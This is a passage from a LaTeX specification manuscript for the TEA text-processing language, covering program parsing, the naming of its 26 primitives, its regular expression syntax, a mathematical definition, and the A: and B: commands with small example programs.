  \begin{lstlisting}[language=TEA, caption={TP 2}, label={LST2}, numbers=left]
i: {This is a multi-line
string}|u!:|g:|l:E|x:{1-}|f:^1-i:A:B|l:A|x!:-1|j:C|l:B|i!:"T"|j:E|l:C|q!:
  \end{lstlisting}
  \end{tcolorbox}
  \caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  \label{FIG8}
\end{figure}

In parsing such a program relative to the given TEA grammar (see \textbf{\autoref{SECGRAM}}), one might approach the task thus:

\begin{enumerate}
\item{ Have a TEA Instruction Line list to hold each complete TEA Instruction per entry, in the natural order they appear in the code.

\begin{enumerate}
\item{
To help with dealing with Multi-line strings anywhere within the program, and which are the only reason parsing might become tricky, start by turning all such Multi-line instructions into single line forms. For example, given any such instructions shall be the kind involving Multi-line strings which are mandatorily delimited by either `` \& " or \{ \& \}, then find a means to momentarily substitute newline characters within such explicit strings in the code with some special marker such as a rare character RC. Thus, any such previously Multi-line strings shall take the modified form {...RC..RCRC...} After this transformation, we can comfortably proceed to process the source code as though all instructions either span a whole single line or multiple instructions sit on the same line (delimited of course).
}
\item Start by splitting the modified code by newlines.
\item For each line, check for whether the line is an opaque line or a TEA Instruction Line.
\item{ If opaque ignore and move to the next, otherwise extract the TEA instructions on that line as follows:

\begin{enumerate}
\item{
If the line is an instruction line with only a single TEA Instruction on it, reverse the RC-NL transform above if necessary, then add the instruction to the instruction list. Otherwise if multiple instructions exist on the line (delimited by \texttt{|}), then extract each instruction statement and add it to the instruction list in the exact order in which it appears on the line. 
}
\item {
Finally, once all the instructions have been extracted and stored in an ordered list, perhaps with clear annotation for what kind of instruction it is (for example noting label statements since they shall merely serve for control flow), then proceed to execute the TEA program by operating on the list of instructions. 
}
\end{enumerate}
}
\end{enumerate}

}
\end{enumerate}


Generally, one might appreciate the simplicity of parsing, validating and then executing TEA program source code by studying the TEA execution process as depicted in the flowchart in  \textbf{\autoref{FIGTEAEXECPROCESS}}:


\begin{figure}[H]
  \begin{center}
  %\includegraphics[trim=2cm 8cm 2cm 8cm, clip, width=0.9\textwidth,]{resources/pdfs/ProteinSynthesisStateMachine.pdf}\\
   \includegraphics[trim=0cm 1cm 0cm 0cm, clip, width=0.9\textwidth,]{resources/pdfs/TEA_PROGRAM_EXEC_PROCESS.pdf}\\
   \caption{The TEA Program Execution Process.}
  \label{FIGTEAEXECPROCESS}
  \end{center}
\end{figure}


\section{Tea Instruction Set And The Tea Command Primitive Names}

First, let us look at the current reference list of the 26 TEA primitives and their formal names as depicted in \textbf{\autoref{FIGTEAISET}}:


\begin{figure}[H]
  \begin{center}
  %\includegraphics[trim=2cm 8cm 2cm 8cm, clip, width=0.9\textwidth,]{resources/pdfs/ProteinSynthesisStateMachine.pdf}\\
   \includegraphics[trim=0cm 1cm 0cm 0cm, clip, width=0.9\textwidth,]{resources/tea_cs_is.png}\\
   \caption{The TEA Instruction Set (26 TEA Primitives and their names).}
  \label{FIGTEAISET}
  \end{center}
\end{figure}

In the rest of this manuscript, we then fully define each of these primitives, with focus on what purpose each primitive serves in a TEA program, what syntax it expects, as well as the function and semantics associated with it. For best clarity, each primitive shall be treated in its own chapter, but the approach and structure of the specification remains the same across all the 26 TEA primitives.


\subsection{The Tea Command Naming Standard}

Some people shall wonder, and correctly so, \textit{just how did we come up with the useful names for the 26 TEA primitives} as depicted in \textbf{\autoref{FIGTEAISET}}? And there is no simple answer for that except the method and creativity that the inventor of the language utilized during the architecting/design phase of the language, and so, we get a glimpse of the process that went into that task, as explained hereafter:

All TEA commands are essentially verbs - they tell the TEA processor to do something, but also, based on the name and expression of the verb, they also specify or hint at how to do that thing or what exactly to do or not do. Thus, in choosing names for the TEA Instruction Set primitive commands – which, though they might already be easy to call by the names of their constituent TEA primitive letters ``a" to ``z", would better be named suitably to distinguish them from ordinary Latin alphabet letters, and also to help reflect or clarify on their function in TEA. The following 4 guiding principles serve that purpose:


\begin{enumerate}
\item The Command Name must start with the same letter as the TEA command for which it is a name.
\item The Command Name must reflect or hint to the verb or action the command is designed to do, and not be ambiguous.
\item The Command Name must be a single word, preferably in English.
\item The Command Name must be unique across the instruction set, but this already follows from condition \#1 in this list.
\end{enumerate}

Thus, some tricky TEA primitives such as W: might perhaps better be named ``Webify" instead of original proposal to use ``Web", and for U: to be called ``Uniqueify" instead of ``Unique". But, condition \#2 somewhat helps relax or dismiss the need for these renamings if they seem too extreme. However, with the Instruction Set as expressed above, we can boldly say each of the 26 primitive instructions in TEA clearly and non-ambiguously define not only what each instruction does, but also how. Just by looking at the Command name, or even just the command's first letter... Which surely is not just a clean design choice, but also shall serve to make learning, reading and applying TEA programs very easy. Of course, unlike many of not most existing programming languages, the TEA language can boast of having the simplest instruction set, and also one that's very precise in semantics and purpose, and which, with the use of mnemonics such as reading and memorizing the TEA command name map above, becomes readily palatable and learnable even for little kids just learning the alphabet.

\chapter{TEA REGULAR EXPRESSIONS}
\label{SECREGEXP}

Note that, as indicated in the \textbf{\hyperref[SEC1]{Introduction}} --- \textbf{\hyperref[SECNOMEN]{Section \ref{SECNOMEN}}} , \textbf{Regular Expressions} are \textit{a special type of text} that TEA programs recognize while everything else is merely treated as plain text or mere strings. Also, despite the fact that like many programming languages out there, the particular subset of the regular expressions language or standard might vary from implementation to implementation, or from language to language, whereas, for the TEA language in both its native-platform standard as well as the WEB TEA standard can be safely considered to support the common-subset of regular expression rules and syntax as laid out hereafter:


\begin{longtable}{@{}>{\ttfamily}p{0.25\linewidth}p{0.7\linewidth}@{}}
\hline
\multicolumn{2}{c}{\textbf{Character Matching}} \\
\hline
. & Matches any character except newline \\
\textbackslash{}d & Digit (0–9) \\
\textbackslash{}D & Non-digit \\
\textbackslash{}w & Word character (a–z, A–Z, 0–9, \_) \\
\textbackslash{}W & Non-word character \\
\textbackslash{}s & Whitespace (space, tab, newline) \\
\textbackslash{}S & Non-whitespace \\
\hline
\multicolumn{2}{c}{\textbf{Character Classes}} \\
\hline
[abc] & Matches a, b, or c \\
\verb|[^abc]| & Matches any character except a, b, or c \\
\verb|[a-z]| & Matches any lowercase letter from a to z \\
\hline
\multicolumn{2}{c}{\textbf{Quantifiers}} \\
\hline
* & Matches 0 or more repetitions \\
+ & Matches 1 or more repetitions \\
? & Matches 0 or 1 repetition \\
\verb|{n}| & Matches exactly n times \\
\verb|{n,}| & Matches at least n times \\
\verb|{n,m}| & Matches between n and m times \\
\hline
\multicolumn{2}{c}{\textbf{Anchors}} \\
\hline
\verb|^| & Matches start of string \\
\$ & Matches end of string \\
\verb|\b| & Matches word boundary \\
\verb|\B| & Matches non-word boundary \\
\hline
\multicolumn{2}{c}{\textbf{Grouping and Alternation}} \\
\hline
(abc) & Capturing group for abc \\
(?:abc) & Non-capturing group for abc \\
a|b & Matches a or b \\
\hline
\multicolumn{2}{c}{\textbf{Escaping}} \\
\hline
\verb|\| & Escapes special characters (e.g., \texttt{\textbackslash{}.} matches a literal dot) \\
\hline
\end{longtable}


As we shall see when we come to the sections treating of the 26 TEA \textbf{A:} to \textbf{Z:} proper, regular expressions in TEA \textbf{ONLY} get treated as such, in \textbf{specific} sections of a TEA instruction where the instruction \textbf{explicitly expects a regular expression}, and nowhere else. 

For example, if we wrote the code:

\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program Example 1]
  \begin{lstlisting}[language=TEA]
i!:^$
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

The parameter being passed to the \textbf{I!:} instruction is \textbf{always} treated as a string no matter what. Thus, the attempt to have the command treat the argument ``\verb|^$|" as though it were a regular expression --- in case that is what the programmer thought or wanted, is futile here. In this case, since \textbf{I!:} is the \textbf{INTERACT} instruction that sets its parameter as the explicit instruction output if provided, shall result in that TEA program returning the value ``\verb|^$|" as the output.

Similarly, the following program:


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program Example 2]
  \begin{lstlisting}[language=TEA]
d!:^$
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

Shall treat whatever is passed to the \textbf{D!:} instruction as a regular expression no matter what, so that, this program --- as we shall come to understand after studying the semantics of \textbf{D:}, the \textbf{DELETE} TEA primitive in \textbf{\hyperref[CHAPD]{Chapter \ref{CHAPD}}}, in its \textbf{D!:} form, shall eliminate from whatever active input occurred before it, everything but what matches the specified regular expression pattern --- in this case ``\verb|^$|", and so that, the instruction shall always return nothing but ``" when used as specified in that program.

Also, talking of the quirks of regular expressions in TEA, note that with experience and experimentation, one comes to learn how best to write or pass regular expressions to a TEA instruction or program. For example, given that the ``\verb$|$" character is treated as the special TEA instruction delimiter (especially for one-liners or minified TEA programs that might not delimit each instruction using the newline character), trying to write or pass a correct regular expression such as ``a\verb$|$b" might be tricky. Take the following example program:


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program Example 3]
  \begin{lstlisting}[language=TEA]
i!:Hello World | d!:e|l
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

That program attempts to use the \texttt{d!:e|l} instruction to keep only things in the input that either match either ``e" or ``l", however, using or writing the necessary regular expression as shown will result in the output ``e" since the TEA program is interpreted as though the last ``\verb#|#" were a TEA instruction delimiter\footnote{More about this was covered well in \textbf{\hyperref[SECGRAM]{Section \ref{SECGRAM}}}.}, so that the final part of the regular expression --- ``l", gets discarded as extraneous non-executable text or a \textbf{TEA Opaque Expression}. Thus, to correctly use such a tricky/special regular expression, that program would need to be re-written as such:



\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program Example 3]
  \begin{lstlisting}[language=TEA]
i!:Hello World | d!:{e|l}
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

Which then returns the output ``elll" given what we forced the input to be with \texttt{i!:Hello World}.

Concerning this matter, note that still, and despite regular expressions being a special case in TEA programs, and yet, \textbf{in the simplest sense}, TEA regular expressions are still nothing but mere strings/text! The last example above shall help illustrate this given the fact that we use the TEA string delimiters ``\{" and ``\}" to correctly contain the regular expression string parameter that we intend to pass to the \texttt{D!:} instruction.

Thus, though \textbf{the signature} of a TEA instruction shall determine which sections/positional-arguments of a TEA instruction can/are regular expressions and which are not, and yet, when expressing them in code, TEA regular expressions can be treated as though they were normal TEA strings\footnote{\textbf{IMPORTANT} to note that this likewise applies to other \textit{special types} in TEA instructions such as \textbf{block names} --- used with branching instructions such as \texttt{F:REGEX:lBLOCK} and \texttt{J:lBLOCK}, as well as \textbf{vault names} --- used with vault/memory referencing instructions such as \texttt{r*:vNAME:REGEX:SUBSTR}}.





\chapter{TEA and The Mathematics of TRANSFORMATICS}
\label{SECTRANSFORM}


TEA is based on The Mathematics of Transformatics\cite{Lutalo2025_transformatics_thesis}. 

\vspace{1em}



The project's GitHub homepage\cite{cli_tttt} does offer a sufficient plain-English definition of the language in its introduction, and we have already looked at the language's Computer-Science/Regular Language definition in \textbf{\hyperref[SEC2]{Chapter \ref{SEC2}}}, but, we shall also augment or deviate from either, by also considering \textbf{the mathematical definition of the TEA computer programming language}, which we present for the first-time here as:\\



\begin{defn}[The \textbf{Transforming Executable Alphabet}, TEA language]
\label{DEFTEA}

TEA is the Transforming Executable Alphabet\cite{lutalo2024software}; a general-purpose [computer] programming language that is Text-Processing oriented, enables a sequence-transformer chaining paradigm\cite{Lutalo2025_transformatics_thesis}, and which is designed based on a set of 26, decorated and/or qualified single-letter primitives, A: to Z: (or rather a: to z:) which are based on the standard Latin Alphabet; {A,B,C,...,Z}\cite{Lutalo2024TEATAZ}.

\vspace{1em}

And so that, a \textbf{TEA program}, $\mathbb{T}^n$, is an ordered sequence of $n$ sub-sequences $t_{i \in [1,n]}$ --- also known as \textbf{TEA Instructions}(TI) that are any valid self-contained individual instruction expressions in the \textbf{TEA language}, and which are then applied to some initial input $I_0: I_0 \equiv \emptyset \quad \lor \quad I_0 \neq \emptyset$, also known as the \textbf{TEA Input}, and such that, by processing or executing the higher-order sequence $\mathbb{T}^n$, we finally produce some sequence, $O: O \equiv I_0 \quad \lor \quad O \neq I_0$, via a processing (with or without branching), of the chain of contained TEA instructions expressed by each of the $n$ sub-sequences/sub-expressions $t_i$. 

\vspace{1em}

Equivalently, we produce $O$ given some $I_0$, by applying $\mathbb{T}^n$ to it as such:

\begin{trans}
\label{TRANSDEFTEA}
$I_0 \xrightarrow{t_1} I_1 \xrightarrow{t_2} I_2 \cdots  \xrightarrow{t_i} I_{i+1} \cdots \xrightarrow{t_n} I_{n+1} = O;$\\
$\forall t_i \in \mathbb{T}^n$
\end{trans}



And more succinctly:

\begin{trans}
\label{TRANSDEFTEAB}
$I_0 \xrightarrow{\mathbb{T}^n} I_{n+1} = O$
\end{trans}

\end{defn}


If you have come across the new/emerging mathematical theory of Transformatics\cite{Lutalo2025_transformatics_thesis}, which also is the mathematical subdiscipline that treats of especially ordered sequences of both lower-order\cite{Lutalo2025_transformatics_thesis} (sets, lists, flat-sequences) and higher-order\cite{Lutalo2025_transformatics_thesis} (dictionaries, matrices, tuples, n-grams, etc), then you shall come to appreciate that much of how the processing, analysis and expression of sequences is done in Transformatics is how data/sequences/text is treated in the TEA language --- refer to \textbf{Proposal 9} presented in \cite{Lutalo2025_transformatics_thesis}. This shall also explain why it is that TEA, the Transforming Executable Alphabet, is considered to be a language whose paradigm is the chaining of sequence-transformers.

\vspace{1em}

In \cite{cli_tttt} is covered well, the matter of the TEA language and its relation to the traditional UNIX/Linux philosophy; of well-designed basic tools such as text processing tools or data transformation utilities, and how they might be composed via ``piping", to help compose complex logical, computational and/or automation solutions to arbitrary problems. \textbf{The mathematics of Transformatics is what really helps generalize these ideas well enough into a logical framework, system or theory devoid of any dependence on particular technologies or applications, and instead focusing on the ideas of sequences, sequence-transformers and their composition and/or application in the perspective of pure and applied mathematics somewhat reminiscent of linear-algebra.}





%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% BEGIN TAZ SECTION
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\chapter{TEA A: TO Z: COMMAND SPACE SPECIFICATION (Introduction)}
\label{SECTAZ}

In the rest of this section, we shall look at the full formal specification as well as some explanatory and/or illustrative notes, as well as several example TEA programs, concerning each one of the 26 \textbf{A:} to \textbf{Z:} TEA primitives, one at a time. For historical purposes, the only other authoritative existing reference material in relation to the TAZ is in a couple of exploratory lectures\footnote{Find the \textbf{TEA: Transforming executable alphabet mini-lectures} series on YouTube: \url{https://youtube.com/playlist?list=PL9nqA7nxEPgulGKWw1L9xEyqgCdEezaKB&feature=shared}} that the language’s inventor gave mostly before this manuscript was originally prepared.

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% TAZ SECTION: A
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\chapter{A: ANAGRAMMATIZE}
\label{CHAPA}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.2\textwidth}|p{0.5\textwidth}}
 
	\textbf{NAME} & Anagrammatize\\
	\hline
	\textbf{Purpose} & \begin{enumerate}
	\item Compute anagrams
	\item Shuffle lists
	\item Randomize letters
	\item Create randomness
	\end{enumerate}\\
	\hline
	              
\end{tabular}
\caption{General Objectives of A:}
  \label{TABTAZA}
\end{table}


\section{SEMANTICS of A:}
\label{SECSEMA}

\begin{table}[H]
\centering
\renewcommand{\arraystretch}{1.3} % Optional: increases row height
\rowcolors{1}{lightgray}{white}   % Alternating row colors
\begin{tabular}{>{\bfseries}m{0.3\linewidth} | m{0.6\linewidth}} % 2 columns, 

\rowcolor{white}
\textbf{\makecell[l]{INSTRUCTION\\ SIGNATURE}} & \textbf{INSTRUCTION FUNCTION} \\
\hline

a: & Set IO as the AI anagrammatized by words \\

\rowcolor{lightgray}\bfseries a:STR & Same as a:, but operating on the string STR \\

 a!: & Set IO as the AI anagrammatized by characters \\
 
\rowcolor{lightgray}\bfseries a!:STR & Same as a!:, but operating on string STR \\

 \makecell[l]{a*:vNAME \\ a*!:vNAME}& The first as a:, the second as a!:, but operating on string in vault vNAME \\
 
 \hline
\end{tabular}
\caption{The Semantics of A:}
\label{TABSEMA}
\end{table}


\section{NOTES about A:}
\label{SECNOTESA}

By the definitions above, the program:



 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: shuffling words in a string]
  %\begin{lstlisting}[language=TEA, caption={TP A1}, label={LSTA1}, numbers=left]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB}|a:
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGA1}
\end{figure}


could return “CB BA AB BC” --- note that \textbf{a:} basically shuffles the words in the AI --- which, given TEA only has the two types; regular expressions and strings, we might as well say, \textbf{a:} can shuffle words in a list (where, the items in the list are assumed to be containing no white space in them, and thus can be delimited using white space). 

On the other hand, the related but different program


 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: shuffling a list of symbols]
  %\begin{lstlisting}[language=TEA, caption={TP A2}, label={LSTA2}, numbers=left]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB} | a!:
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGA2}
\end{figure}

would return something like “  ABBCB ACB” because \textbf{a!:} shuffles the contents of the AI at character level --- it's like shuffling a list once again, but with the empty string as the delimiter this time.


\section{EXAMPLE APPLICATIONS of A:}
\label{SECEXAMPA}

Because \textbf{A:} allows us to shuffle items in a list, we might use it to construct programs that can be used to make decisions based on a random selection of some item from the list. 

\subsection{EXAMPLE 1: Randomly Pick What to Cook}
\label{SECEXAMP1A}

The following program, given a list of food items available, shall help to randomly pick what to cook on a particular day or at any moment it is tasked with making a suggestion:


 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: randomly suggest what to cook]
  %\begin{lstlisting}[language=TEA, caption={TP A3}, label={LSTA3}, numbers=left]
  \begin{lstlisting}[language=TEA]
i!:{BURGER PIZZA OMELETTE RICE PUDDING FRIES 
MEATBALLS}|a:|d:[ ].*$|x:{I think, you make }
#(=I think, you make PUDDING, VAULTS:{})
#(=I think, you make BURGER, VAULTS:{})
   \end{lstlisting}
  \end{tcolorbox}
  \caption{TEA EXAMPLE: Random Meal Recommender}
  \label{FIGA3}
\end{figure}

Note that, like we saw in \textbf{\autoref{SECPARSE}}, the source code of a legitimate TEA program might sometimes contain non-executable lines such as TEA comments --- these being the lines shown in gray color, and which start with the character ``\#". But also, as explained in the section on how to debug TEA programs as well as in the TEA Debugging paper\cite{Lutalo2025debug}, we might sometimes want to demonstrate what is going on or what is expected to be the internal state of a TEA program at either its termination point, or anywhere before that, by placing some illustrative comments such as the last two lines in that program in \textbf{\autoref{FIGA3}}.




%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% TAZ SECTION: B
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\chapter{B: BASIFY}
\label{SECB}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.2\textwidth}|p{0.5\textwidth}}
 
	\textbf{NAME} & Basify\\
	\hline
	\textbf{Purpose} & \begin{enumerate}
	\item Compute the Lexical Base of input
	\item Reduce input/list to distinct symbols, sorted by their order of first occurrence in the input
	\item Reduce input to distinct symbols, sorted by their lexical/alphabetical order
	\item Implementing FIFOs
	\item Generating lexical keys
	\item Comparing things by their lexical keys
	\end{enumerate}\\
	\hline
	              
\end{tabular}
\caption{General Objectives of B:}
  \label{TABTAZB}
\end{table}


\section{SEMANTICS of B:}
\label{SECSEMB}


\begin{table}[H]
\centering
\renewcommand{\arraystretch}{1.3} % Optional: increases row height
\rowcolors{1}{lightgray}{white}   % Alternating row colors
\begin{tabular}{>{\bfseries}m{0.3\linewidth} | m{0.6\linewidth}} % 2 columns, 
\rowcolor{white}
\textbf{\makecell[l]{INSTRUCTION\\ SIGNATURE}} & \textbf{INSTRUCTION FUNCTION} \\
\hline

b: & Set IO as AI reduced to only its unique characters in their order of first occurrence within AI (\textbf{FIFO Base}) \\

\rowcolor{lightgray}\bfseries b:STR & Same as b:, but operating on string STR \\

b!: & Same as b: but with the results sorted in alphabetical order (\textbf{LEXICAL Base}) \\

\rowcolor{lightgray}\bfseries b!:STR & Same as b!: but operating on STR \\

 \makecell[l]{b*:vNAME \\ b*!:vNAME} & The first as b:, the second as b!:, but operating on string in vault vNAME \\
 
 \hline
\end{tabular}
\caption{The Semantics of B:}
\label{TABSEMB}
\end{table}


\section{NOTES about B:}
\label{SECNOTEB}

The \textbf{Lexical Base} of the AI is to be understood as the reduction of the AI to a string made of only the \textbf{unique} characters in AI, and these, then sorted in ascending \textbf{Lexical Order} for B-Inverse otherwise occurring in their order of occurrence.

By the definitions above, the program:


 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: computing the symbol FIFO Base of AI]
  %\begin{lstlisting}[language=TEA, caption={TP B1}, label={LSTB1}, numbers=left]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB} | b:
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGB1}
\end{figure}


Should return ``BC A". While  


 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: computing LEXICAL Base of AI]
  %\begin{lstlisting}[language=TEA, caption={TP B2}, label={LSTB2}, numbers=left]
  \begin{lstlisting}[language=TEA]
i!:{bC CB BA aB} | b!:
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGB2}
\end{figure}

Should return ``ABCab". While,  


 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: compute FIFO Base of a literal string]
  %\begin{lstlisting}[language=TEA, caption={TP B3}, label={LSTB3}, numbers=left]
  \begin{lstlisting}[language=TEA]
b:{bC CB BA aB}
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGB3}
\end{figure}


Shall or should return exactly ``bC BAa".

 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: computing LEXICAL Base of data in a vault]
  %\begin{lstlisting}[language=TEA, caption={TP B4}, label={LSTB4}, numbers=left]
  \begin{lstlisting}[language=TEA]
v:vAI:{bC CB 543 12a} | b*!:vAI 
#(=12345BCab, VAULTS:{"vAI":"bC CB 543 12a"})
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGB4}
\end{figure}

Should return ``12345BCab". 


\section{EXAMPLE APPLICATIONS of B:}
\label{SECEXAMPB}

It might be alluring to try and use \textbf{B:} to sort arbitrary things, such as attempting to sort a list of children in a classroom by their ascending birthdays in a particular month, or by the order of their first names, however, it should be worth noting that when \textbf{B:} or \textbf{B!:} process any input, they operate on it as a list of symbols or letters, and not as words --- unlike \textbf{A:}, \textbf{B:} doesn't respect white-space delimiters, and so, the best it can be used for, are cases where the sorting that needs to be done, is entirely based on order of non-compound values --- such as individual symbols, characters, digits or letters.

Thus, when passed a list such as ``10 1 9", we should not expect to get something like ``1 9 10", neither `` 0119", but shall instead get something like ``10 9" --- for ``b:" or `` 019" --- for ``b!:". These, because we are computing \textbf{bases at symbol level}.

With that clarification out of the way, we can then appreciate the following example program that can only be best implemented using \texttt{B!:}

\subsection{EXAMPLE 1: Compute Largest Possible o-SSI Number from Several Arbitrary Sequences}
\label{SECEXAMP1B}

In a paper from April 2025, fut. prof. JWL, while exploring RNGs, came across some interesting properties of certain numbers. In particular, the paper \cite{ossipaper} brought to surface the matter of numerical sequences (particularly those of decimal digits), which, when reduced to their sequence symbol set\cite{transformatics}, retain all their original member digits, but also that, those digits are exactly the same members as make-up the symbol set of the base to which the number sequence belongs --- such as $\psi_{10}$ for numbers in base-10. Such numbers, and sequences or numerical expressions of that kind, he named \textbf{orthogonal symbol set identities} (o-SSI). Of course, it is not just o-SSI sequences (meaning, a sequence $S^n: \invpi(S^n) = \invpi(\psi_{n}) = n \quad \land \quad \psi(S^n) \equiv \psi_n$) that can be reduced to an o-SSI sequence for some base-n, but any sequence, $S^k: \invpi(S^k) = k \geq \invpi(\psi_{n}) = n \quad \land \quad \psi_n(S^k) \equiv \psi_n$ also can. 

And so, a problem might arise... In case we had several arbitrary sequences of numbers --- let us assume we have n sequences, $\langle S_1, S_2, S_3,...,S_n \rangle$, each of arbitrary length, and that any two sequences from that collection might not be of the same length or cardinality, and that their member composition and distribution too might not be the same or similar, but that all these sequences span the same base symbol set --- for simplicity, assuming it is $\psi_{10}$. So, assuming we wanted to determine which of these sequences, such as some $S_m$, such that, when we reduce it to just its \textbf{natural symbol set}\footnote{Refer to \textbf{Definition 5} of \cite{ossipaper}}, and from that natural symbol set --- which might or might not be equivalent to $\psi_{10}$, further reduce it to a pure number, $P_{S_m}$. We then know as a fact, that if indeed $\invpi(\psi_{10}(S_m)) = Max(\invpi(\psi_{10}(S_i)) \forall i \in [1,n])$, then that number, if its elements are sorted in descending order of their first occurrence within $\psi_{10}$, shall be the largest possible given all such numbers we might compute for all the sequences in our collection. And further, that that number, $P_{S_m}$, shall be the largest base-10 o-SSI we can derive from the collection of sequences. Essentially that we want to perform the transformation:

\begin{trans}
\label{TRANSB1}
$\langle S_1, S_2, S_3,...,S_n \rangle \quad  \rightarrow \quad \langle P_{S_1}, P_{S_2}, P_{S_3},..., P_{S_n} \rangle  \quad \xrightarrow{O_{find\_max P_{S_i}}} P_{S_m};\\
\invpi(P_{S_m}) = m\\
\land |P_{S_m}| \geq |P_{S_i}| \quad \forall S_i, i \in [1,n]$ 
\end{trans}

And find $P_{S_m}$ given some or any such collection of sequences. Good enough, in TEA, we have the necessary tools to go about resolving such a problem, and the following basic program solves the first bit of this task: it essentially reduces any input sequence (whether purely numeric or alpha-numeric) to just its unique decimal digits (thus $\psi_{10}(S_i)$), and from that reduced sequence, to just the largest possible decimal pure number based on those digits (thus $P_{S_i}$). So, once we have a sequence of such pure numbers, of course we can determine which of them is the largest, and thus could work backwards to which sequence it was that is its source.


 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: compute largest o-ssi from input sequence]
  %\begin{lstlisting}[language=TEA, caption={TP B5}, label={LSTB5}, numbers=left]
  \begin{lstlisting}[language=TEA]
i:{63 285 02517 abc3921 219e}
d!:[0-9]
b!: 
m!:
#(=987653210, VAULTS:{})
   \end{lstlisting}
  \end{tcolorbox}
  \caption{TEA EXAMPLE: Computing Largest o-SSI}
  \label{FIGB5}
\end{figure}

Note that in this example in \textbf{\autoref{FIGB5}}, we have wanted to demonstrate that the input sequence might contain \textit{noise} --- such as non-digit symbols, and so, these are eliminated using some of the TEA commands we shall encounter later, however, irrespective of the input, the result shall always be the largest possible decimal pure number we can form from the natural symbol set of the input under base-10.

Thus, applying this program to a set of various, random inputs as tabulated below, we see that it becomes easy to identify which of the input sequences is $S_m$.



\begin{table}[H]
  \centering
	\begin{tabular}[t]{|c|c|c|c|c|c|}
	\hline
	$i\in[1,n]$& \textbf{\makecell{INPUT:\\$S_i$}} & $S_{10}$ & $\psi_{10}(S_i)$ & $P_{S_i}$ & Rank($ \geq |P_{S_m}|$) \\
	\hline
	\makecell{Associated\\TEA} & \texttt{i:\{...\}} & \texttt{d!:[0-9]}	& \texttt{b!:} & \texttt{m!:} & \texttt{z:\{AI...\}}\\
	\hline
	\hline	
	1&$\langle 63 285 02517 abc3921 219e \rangle$ & $\langle 63 285 02517 abc3921 219e \rangle$ & 012356789 & 987653210 & 1\\
	\hline
	2&$\langle 63 25 02517 \rangle$ & $\langle 632502517 \rangle$  & 0123567 & 7653210 & 2\\
	\hline
	3&$\langle 1998 1994 1984 1001 \rangle$ & $\langle 1998199419841001 \rangle$ & 01489 & 98410  & 4\\
	\hline
	4&$\langle 124 999 452 111 98 ae this is 9519 \rangle$ & $\langle 124999452111989519 \rangle$ & 124589  & 985421 & 3\\
	\hline	              
\end{tabular}
  \caption{Tabular Analysis to identify $S_m$ given a collection of arbitrary alpha-numeric sequences}
    \label{TABANAB1}
\end{table}


From the analysis we have conducted in \textbf{\autoref{TABANAB1}}, and which is based on computations we conduct on the input/presented data --- alpha-numeric sequences $S_{i\in [1,n]}$, as depicted in the TEA program (see  \textbf{\autoref{FIGB5}}), we find that the solution to our problem then, shall be the sequence:

\begin{equation}
\label{EQB1}
S_1 = \langle 63 285 02517 abc3921 219e \rangle
\end{equation}

And how did we know or how might we prove this? Or rather, how did we arrive at the final results in the \textbf{RANK} column? Without evolving the original program further, note that, once we have the $P_{S_i}$ values ($5^{th}$ column), we then can sort them --- not lexically as usual TEA might allow, but numerically, and with use of some little \textit{external power} as we shall see when we come to the TEA primitive \textbf{Z:}:



 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: sort in descending order numbers from input sequence]
  %\begin{lstlisting}[language=TEA, caption={TP B6}, label={LSTB6}, numbers=left]
  \begin{lstlisting}[language=TEA]
i:{987653210 7653210 98410 985421} 
r!:[ ]+:,
x:[
x!:]
z:{JSON.parse(AI).map(s=>Number(s)).sort((a,b)=>b-a)}
h!:,
d:,
   \end{lstlisting}
